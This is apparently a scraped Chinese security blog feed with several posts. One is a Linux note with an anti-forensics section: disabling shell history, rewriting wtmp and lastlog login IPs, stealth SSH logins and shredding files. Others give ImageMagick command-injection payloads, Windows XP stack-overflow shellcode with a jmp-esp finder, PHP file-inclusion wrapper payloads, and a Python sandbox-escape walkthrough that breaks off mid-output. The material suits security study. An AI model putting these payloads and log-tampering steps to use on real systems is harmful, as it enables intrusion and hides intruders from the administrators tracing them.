python*find / -name gcc*find / -name cc如何上传文件？find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp 安全检查123456789101112131415161718192021222324252627282930313233# 查看指定端口的pid netstat -antup | grep 5001# 杀死指定pid 进程 kill -9 12312# 创建新用户 orleven$ useradd orleven# 新用户允许使用sudo$ chmod u+w /etc/sudoers$ vi /etc/sudoers 找到这行 root ALL=(ALL:ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)$ chmod u-w /etc/sudoers# 生产机器禁止ROOT远程SSH登录：$ vi /etc/ssh/sshd_config PermitRootLogin no$ service sshd restart# 设置允许远程登录$ vi /etc/ssh/sshd_config AllowUsers orleven$ service sshd restart# 系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？$ apt-get update &amp;&amp; apt-get upgrade$ yum update# 查看进程： ps -e | grep ssh ps -e -o &apos;%C : %p : %z : %a&apos;|sort -k5 -nr 按内存从大到小排列 ps -e -o &apos;%C : %p : %z : %a&apos;|sort -nr 按cpu利用率从大到小排列 这里附上一个网传的Linux安全检查脚本 清除日志12345678910111213141516171819202122232425262728293031323334353637383940414243登录后执行下面命令,不记录历史命令(.bash_history)unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0last命令结果修改ip(如果修改用户什么的,自己修改下把)Centosutmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv /tmp/wtmp1 /var/log/wtmpunix/usr/lib/acct/fwtmp &lt; /var/adm/wtmpx | sed "s/192.168.8.88/localhost/g" | /usr/lib/acct/fwtmp -ic &gt; /var/adm/wtmpxlastlog 修改替换sed -i 's/192.168.1.1/8.8.8.8/' /var/log/lastlog不记录ssh公钥在本地.ssh目录中ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i多次覆盖文件，使得即使是昂贵的硬件探测仪器也难以将数据复原 -n, --iterations=N 覆盖N 次，而非使用默认的3 次。shred -n 31337 -z -u filename-n, --iterations=N 覆盖N 次，而非使用默认的3 次-z, --zero 最后一次使用0 进行覆盖以隐藏覆盖动作-u, --remove 覆盖后截断并删除文件登录账户 w下管理员是看不到的ssh -T somebody@8.8.8.8 /bin/bash –i日志文件/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一/var/log/secure 与安全相关的日志信息/var/log/maillog 与邮件相关的日志信息/var/log/cron 与定时任务相关的日志信息/var/log/spooler 与UUCP和news设备相关的日志信息/var/log/boot.log 守护进程启动和停止相关的日志消息/var/log/btmp – 记录所有失败登录信息 命令:lastb/var/log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)删除部分日志,比如以当天日期或者自己的登录ipsed -i '/当前时间/'d /var/log/messages 个人建议登录linux,使用winscp工具连接,选择sftp协议,执行命令或者操作目录文件,在history,lastlog,last,w下不会有记录,但是在/var/log/secure会有sftp连接记录,只需要清理登录日志就可以了]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 安装 ImageMagick 以及命令执行漏洞复现]]></title>
    <url>%2F2016%2F12%2F01%2FimageMagick-linux-code-execution%2F</url>
    <content type="text"><![CDATA[概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。 安装123456tar -vxjf ImageMagick-6.9.5-3.tar.bz2 cd ImageMagick-6.9.5-3./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-staticmakemake installvim ~/.bash_profile 输入 1234PATH=$PATH:/opt/bokee/ImageMagick/binexport LD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport DYLD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport PATH 12source ~/.bash_profileconvert -version 这样就安装完毕了ImageMagick，下面安装php扩展 12345678910111213wget http://pecl.php.net/get/imagick-3.1.2.tgztar zxvf imagick-3.1.2.tgzcd imagick-3.1.2/opt/lampp/bin/phpize # 据自己的情况找到这个文件运行 find / -name phpizeexport PKG_CONFIG_PATH=/opt/bokee/ImageMagick/lib/pkgconfig/export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/./configure --with-imagick=/opt/bokee/ImageMagickmakemake installldconfigfind / -name php.inivi /opt/lampp/etc/php.ini添加：extension = "imagick.so" 错误以及解决方法运行/usr/local/webserver/php/bin/phpize时出现： 123456Configuring for:PHP Api Version: 20041225Zend Module Api No: 20060613Zend Extension Api No: 220060519Cannot find autoconf. Please check your autoconf installation and the$PHP_AUTOCONF environment variable. Then, rerun this script. 解决方法： 12345678910cd /usr/srcwget http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gztar -zvxf m4-1.4.9.tar.gzcd m4-1.4.9/./configure &amp;&amp; make &amp;&amp; make installcd ../wget http://ftp.gnu.org/gnu/autoconf/autoconf-2.62.tar.gztar -zvxf autoconf-2.62.tar.gzcd autoconf-2.62/./configure &amp;&amp; make &amp;&amp; make install 如果出现如下错误： 1configure: error: Cannot find php-config. Please use --with-php-config=PATH 解决方法： 12find / -name php-config./configure --with-php-config=/opt/lampp/bin/php-config --with-imagick=/opt/bokee/ImageMagick 如果出现如下错误： 1wand/MagickWand.h: No such file or directory 解决方法： 1export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/ 如果出现如下错误： 1XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system. 解决方法： 1234567891011121314vi /opt/lampp/lampp# XAMPP is currently 32 bit only#case `uname -m` in# *_64)# if /opt/lampp/bin/php -v &gt; /dev/null 2&gt;&amp;1# then# :# else# $de &amp;&amp; echo &quot;XAMPP gibt es zur Zeit nur als 32-Bit Applikation. Bitte verwende eine 32-Bit Kompatibilitaetsbibliothek fuer Dein System.&quot;# $de || echo &quot;XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.&quot;# exit# fi# ;;#esac 原理分析与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。 ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的. 在ImageMagick的默认配置文件里可以看到所有的委托：/etc/ImageMagick/delegates.xml拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。 漏洞复现ImageMagick popen_utf8命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 其实就是文件名引发的命令执行。 payload : 123&lt;?phpnew Imagick('|touch /tmp/niubl');?&gt; ImageMagick 命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 payload : 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;pop graphic-context 将以上内容保存为test.png图片，执行convert test.png 1.png，就会执行命令。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>code execution</tag>
        <tag>imageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 基础]]></title>
    <url>%2F2016%2F11%2F22%2Fdocker%2F</url>
    <content type="text"><![CDATA[概述Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 详情创建镜像创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 openvz的模板 123456# 下载模板$ wget http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64.tar.gz# 导入镜像（由于是网上找的，记得更新源）$ docker import ubuntu-14.04-x86_64.tar.gz ubuntu:base# 查看镜像$ docker images 常用指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 进入虚拟机$ docker run -t -i ubuntu:base /bin/bash$ docker run -v /home/orleven/docker/common:/tmp -t -i orleven/base:ubuntu_14.04 /bin/bash# 后台运行容器$ Ctrl-P + Ctrl-Q# 保存容器为镜像$ docker commit -m "ubuntu_base" -a "orleven" 942 orleven/base:ubuntu_14.04# 登陆hub$ docker login -u orleven# 将某一个镜像发布到官方网站。$ docker push (镜像名:tag)# 进入容器$ docker attach 432# 运行容器$ docker start id# 下载一个ubuntu镜像$ docker pull (镜像名:tag)# 挂载文件夹 端口映射 镜像名$ docker run -v /home/orleven/docker/web1:/opt/lampp/htdocs -it -p 9001:80 ubuntu:latest$ docker run -v /home/orleven/docker/common:/tmp/ -it -p 9001:80 ubuntu# 可以列出所有安装过的镜像。$ docker images# 查看正在运行的容器$ docker ps# 查看更详细的关于某一个容器的信息。$ docker inspect efe(id 前三位)# 在learn/tutorial镜像里面安装ping程序。(必须带上y)$ docker run learn/tutorial apt-get install -y ping# 查看版本$ docker version # 搜索镜像 $ docker search 镜像名字 # 查看日志$ docker logs# 假设我们要导出的镜像名为orleven/base:ubuntu_14.04 docker save -o ubuntu14.04_base.tar.gz orleven/base:ubuntu_14.04 # 保存镜像至ubuntu14.04_base.tar.gz的文件。这需要一点时间。$ docker export f6c &gt; ./ubuntu14.04_base.tar.gz 特殊指令组合12345678910使用`docker logs`快速查看`access.log`$ docker attach 432$ tail -f access.log$ ctul + p ctul + q$ docker logs清空none$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker stop$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker rm$ docker images|grep none|awk '&#123;print $3 &#125;'|xargs docker rmi]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows XP 溢出]]></title>
    <url>%2F2016%2F11%2F10%2Fwindows-overflow-xp%2F</url>
    <content type="text"><![CDATA[概述虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。 目标代码1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;char name[] = "abcdef";int main()&#123; char output[8]; strcpy(output, name); for(int i=0;i&lt;8&amp;&amp;output[i];i++) printf("\\0x%x",output[i]); return 0;&#125; 步骤它的运行时这样的： 假如name[] 的字符串变长 ，例如： 1char name[] = &quot;abcdefghijklmnopqrst&quot;; 就会发生溢出，vc6.0 就会报错： 可见后面的值溢出，覆盖了之后的值。 如果name[]的值是这样： 1234567891011121314151617181920212223242526char name[] = &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; //以上是覆盖掉name的8个字节以及epb个字节&quot;\x12\x45\xfa\x7f&quot; //以上是jmp esp的地址 sp3中文版的值 &quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50&quot;&quot;\xC6\x45\xF4\x4D&quot;&quot;\xC6\x45\xF5\x53&quot; &quot;\xC6\x45\xF6\x56&quot; &quot;\xC6\x45\xF7\x43&quot;&quot;\xC6\x45\xF8\x52&quot;&quot;\xC6\x45\xF9\x54&quot;&quot;\xC6\x45\xFA\x2E&quot;&quot;\xC6\x45\xFB\x44&quot;&quot;\xC6\x45\xFC\x4C&quot;&quot;\xC6\x45\xFD\x4C&quot;&quot;\x8D\x45\xF4\x50\xBA\x7B\x1D\x80\x7C\xFF\xD2&quot;&quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D&quot;&quot;\x89\x45\xF4\xB8\x61\x6E\x64\x2E&quot; &quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22&quot;&quot;\x89\x45\xFC\x33\xD2\x88\x55\xFF&quot;&quot;\x8D\x45\xF4\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&quot;;//以上是ShellCode 则会调用cmd命令 至于jmp esp的地址是怎么来的，一般网上都有，或者。用如下程序寻找 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define DLL_NAME "user32.dll" int main() &#123; BYTE *ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle = LoadLibrary(DLL_NAME); if(!handle) &#123; printf("load dll error!"); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) &#123; try &#123; if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4) &#123; int address = (int)ptr + position; printf("OPCODE found at 0x%x\n", address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf("END OF 0x%x\n", address); done_flag = true; &#125; &#125; return 0; &#125; 上述程序中是在user32.dll中寻找jmp esp的机器码FFE4，会查找到很多的结果，选择其中的一个就可以。这里需要特别说明的是，不同的计算机不同的操作系统版本，所找到的jmp esp的地址可能会不一样，就是说jmp esp的地址往往并不是通用的。当然，也会有几个地址是跨版本的，这个在这里不讨论。这次我们选择其中的一个地址——0x7e490b40。由于是小 端显示，所以应当在“OPQR”的位置反向书写，即400b497e。当然这里不能够直接用类似于记事本这样的软件进行编辑，而是需要用十六进制代码编辑 器操作。 至于shellcode如何得出，请继续往下看比如下面这个程序就可以完成开DOS窗口的功能，大家详细看下注释： 123456789101112#include &lt;windows.h&gt;#include &lt;winbase.h&gt;typedef void (*MYPROC)(LPTSTR); //定义函数指针int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(“msvcrt”); ProcAdd = (MYPROC) GetProcAddress(LibHandle, "system"); //查找System函数地址 (ProcAdd) ("command.com"); //其实就是执行System(“command.com”) return 0;&#125; 程序中用GetProcAddress函数获得System的真实地址，但地址究竟是多少，如何查看呢？如下图断点，然后调试 按alt + 8 以及alt+ 5，出现如下界面 按F10 运行到如下位置 EAX变为77c293c7，说明在我的机器上System( )函数的地址是0x77c293c7。 为什么EAX就是System( )函数的地址呢？那是因为函数执行的返回值，在汇编下通常是放在EAX中的，这算是计算机系统的约定吧，所以GetProcAddress（”System”）的返回值（System函数的地址），就在EAX中，为0x77c293c7。 如下是调用cmd代码 12345678#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); system("command.com"); return 0;&#125; 首先来验证一下，在VC中可以用__asm关键字插入汇编，我们把System(“Command.com”)用我们写的汇编替换，LoadLibrary先不动，然后执行，成功！弹出了我们想要的DOS窗口。 12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push edi; //申请4字节空间 push edi; //申请4字节空间 push edi; //申请4字节空间 mov byte ptr[ebp-0ch],63h; //c mov byte ptr[ebp-0bh],6fh; //o mov byte ptr[ebp-0ah],6dh; //m mov byte ptr[ebp-09h],6dh; //m mov byte ptr[ebp-08h],61h; //a mov byte ptr[ebp-07h],6eh; //n mov byte ptr[ebp-06h],64h; //d mov byte ptr[ebp-05h],2eh; //. mov byte ptr[ebp-04h],63h; //c mov byte ptr[ebp-03h],6fh; //o mov byte ptr[ebp-02h],6dh; //m lea eax, [ebp-0ch]; push eax; //command.com串地址作为参数入栈 mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 同样的道理，LoadLibrary(“msvcrt.dll”)也仿照上面改成汇编，注意LoadLibrary可以用如下程序查找。 12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary("kernel32"); printf("msvcrt LibHandle = //x%x\n", LibHandle); ProcAdd=(MYPROC)GetProcAddress(LibHandle,"LoadLibraryA"); printf("LoadLibrary = //x%x\n", ProcAdd); return 0;&#125; 可以看到地址为0x7c801d7b 把两段汇编合起来，将其编译、链接、执行，也成功了！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;windows.h&gt;int main()&#123; //LoadLibrary("msvcrt.dll"); _asm&#123; push ebp; mov ebp,esp; xor eax,eax; push eax; push eax; push eax; mov byte ptr[ebp-0ch],6dh; mov byte ptr[ebp-0bh],73h; mov byte ptr[ebp-0ah],76h; mov byte ptr[ebp-09h],63h; mov byte ptr[ebp-08h],72h; mov byte ptr[ebp-07h],74h; mov byte ptr[ebp-06h],2eh; mov byte ptr[ebp-05h],64h; mov byte ptr[ebp-04h],6ch; mov byte ptr[ebp-03h],6ch; lea eax,[ebp-0ch]; push eax; mov edx, 0x7c801d7b; call edx; &#125; //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push edi; push edi; push edi; mov byte ptr[ebp-0ch],63h; mov byte ptr[ebp-0bh],6fh; mov byte ptr[ebp-0ah],6dh; mov byte ptr[ebp-09h],6dh; mov byte ptr[ebp-08h],61h; mov byte ptr[ebp-07h],6eh; mov byte ptr[ebp-06h],64h; mov byte ptr[ebp-05h],2eh; mov byte ptr[ebp-04h],63h; mov byte ptr[ebp-03h],6fh; mov byte ptr[ebp-02h],6dh; lea eax, [ebp-0ch]; push eax; mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 有了上面的工作，提取ShellCode就只剩下体力活了。我们对刚才的全汇编的程序，按F10进入调试，接着按下Debug工具栏的Disassembly按钮，点右键，在弹出菜单中选中Code Bytes，就出现汇编对应的机器码。因为汇编可以完全完成我们的功能，所以我们把汇编对应的机器码原封不动抄下来，就得到我们想要的ShellCode了。 提取出来的ShellCode如下。 1234567891011unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0"; 最后要验证提取出来的ShellCode能否完成我们的功能。在以前的文章中已经说过方法，只需要新建一个工程和c源文件，然后把ShellCode部分拷下来，存为一个数组，最后在main中添上( (void(*)(void)) &amp;shellcode )()，如下： 1234567891011121314151617unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0";int main()&#123; ( (void(*)(void)) &amp;shellcode )(); return 0;&#125; ( (void(*)(void)) &amp;shellcode )()这句话是关键，它把ShellCode转换成一个参数为空，返回为空的函数指针，并调用它。执行那句就相当于执行ShellCode数组里的那些数 据。如果ShellCode正确，就会完成我们想要的功能，出现一个DOS窗口。我们亲自编写的第一个ShellCode成功完成！]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>overflow</tag>
        <tag>xp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含以及部分封装协议]]></title>
    <url>%2F2016%2F10%2F31%2Fphp-RFI-LFI-protocol%2F</url>
    <content type="text"><![CDATA[概述最近总是遇到有关文件包含的问题，所以觉得有必要学习整理下有关这方面的内容。php支持的协议可以查阅官方手册。 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 这里顺便记一下有关php文件包含的函数： 12345678fopen()file_get_contents()curl_exec()readfile()require()require_once()include()include_once() PHP部分封装协议file 协议文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。 在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径。 123456789&lt;?php $gfile = $_GET['gfile'];if (isset($gfile))&#123; print_r(file_get_contents($gfile));&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=file://C:\mySoft\xampp\htdocs\phpinfo.php// ?gfile=file://C:/mySoft/xampp/htdocs/phpinfo.php http、https 协议允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源(需要allow_url_fopen=On并且 allow_url_include=On)。 HTTP请求会附带一个Host:头，用于兼容基于域名的虚拟主机。如果在你的 php.ini 文件中或字节流上下文（context）配置了user_agent字符串，它也会被包含在请求之中。数据流允许读取资源的 body，而 headers 则储存在了 $http_response_header 变量里。如果需要知道文档资源来自哪个 URL（经过所有重定向的处理后）， 需要处理数据流返回的系列响应报头（response headers）。 example: 12345678&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=http://www.example.com php 协议filterphp://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用（需要allow_url_include=On）。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。 php://filter 参数 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 example: 1234567891011&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=php://filter/read=string.toupper/resource=http://www.example.com// ?gfile=php://filter/read=string.toupper|string.rot13/resource=http://www.example.com// ?gfile=php://filter/read=convert.base64-encode/resource/resource=http://www.example.com inputphp://input 是个可以访问请求的原始数据的只读流（需要allow_url_include=On）。POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充，比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=”multipart/form-data”的时候 php://input 是无效的。 example: 123&lt;?php$content = file_get_contents("php://input");echo $content; //输出name=tom&amp;age=22 zlibzlib: PHP 4.0.4 - PHP 4.2.3（仅支持带 fopencookie 的系统）compress.zlib:// 和 compress.bzip2:// PHP 4.3.0 及以上 用法： compress.zlib://file.gz compress.bzip2://file.bz2 zip://archive.zip#dir/file.txt data自 PHP 5.2.0 起 data:（» RFC 2397）数据流封装器开始有效(需要allow_url_include=On)。 example :12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; echo include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=data://text/plain;base64,SSBsb3ZlIFBIUAo=// ?gfile=data://text/plain;charset=unicode,(●'◡'●)// ?gfile=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==// ?gfile=data://text/plain,&lt;?php phpinfo(); ?&gt; globglob:// — 查找匹配的文件路径模式。glob: 数据流包装器自 PHP 5.3.0 起开始有效，可绕过绕过open_basedir读写文件。 example : 12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; $it = new DirectoryIterator($gfile); foreach($it as $f) &#123; printf("%s: %.1FK&lt;br /&gt;", $f-&gt;getFilename(), $f-&gt;getSize()/1024); &#125;&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=glob://C:\mySoft\xampp\htdocs\*.php// ?gfile=glob://C:/mySoft/xampp/htdocs/*.php pharphar:// 数据流包装器自 PHP 5.3.0 起开始有效。PHP 归档。 123456789&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// 把php代码写入phpinfo文件，然后压缩成zip，再改后缀为.jpg// ?gfile=phar://phpinfo.jpg/phpinfo 大概就先这样把，下次有问题再添加。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>protocol</tag>
        <tag>php</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Sandbox Excape]]></title>
    <url>%2F2016%2F10%2F27%2Fpython-sandbox-excape%2F</url>
    <content type="text"><![CDATA[概述最近刚刚学习了Python Sandbox Excape，赶紧记录一下。 背景这是某个大牛的python沙盒逃逸实验的代码： 12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding: utf-8 -*-# !/usr/bin/env pythonfrom __future__ import print_functionprint("Welcome to my Python sandbox! Enter commands below!")banned = [ "import", "exec", "eval", "pickle", "os", "subprocess", "kevin sucks", "input", "banned", "cry sum more", "sys"]targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: # 去除所有内置函数除print raw_input del __builtins__.__dict__[x]while 1: print("&gt;&gt;&gt;", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print("No bueno") break else: # this means nobreak try: exec data except: print ("error !") 不能出现banned列表中的字符，但是需要读取flag文件内容。 方法file方法123456789&gt;&gt;&gt; [].__class__&lt;type 'list'&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type 'dict'&gt;&gt;&gt;&gt; ().__class__&lt;type 'tuple'&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type 'object'&gt; 发现__subclasses__()里有file： 12&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, 